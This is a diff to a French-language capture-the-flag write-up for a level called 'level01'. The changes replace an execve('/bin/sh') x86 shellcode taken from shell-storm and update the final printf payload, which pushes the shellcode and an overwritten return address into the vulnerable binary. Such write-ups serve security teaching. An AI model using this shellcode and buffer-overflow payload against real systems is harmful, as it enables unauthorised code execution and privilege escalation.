@@ -33,9 +33,9 @@ Il nous faut un buffer dans lequel mettre le code qu'on veut executer. Le buffer
 
 `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac + \x47\xa0\x04\x08`
 
-Le code en question est sous forme d'instructions directement comprehensible par le CPU. Le site shell-storm repertorie differents code machines qui pourraient nous interesser, pour executer la fonction execve avec comme argument "/bin/bash":
-`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
+Le code en question est sous forme d'instructions directement comprehensible par le CPU. Le site shell-storm repertorie differents code machines qui pourraient nous interesser, pour executer la fonction execve avec comme argument "/bin/sh": https://shell-storm.org/shellcode/files/shellcode-841.html
+`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
 
 ## Final
-`printf "dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80\n%80c\x47\xa0\x04\x08\n" A >/tmp/level01.txt`
+`printf "dat_wil\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\n%80c\x47\xa0\x04\x08\n" A >/tmp/level01.txt`
 `cat /tmp/level01.txt - && ./level01`
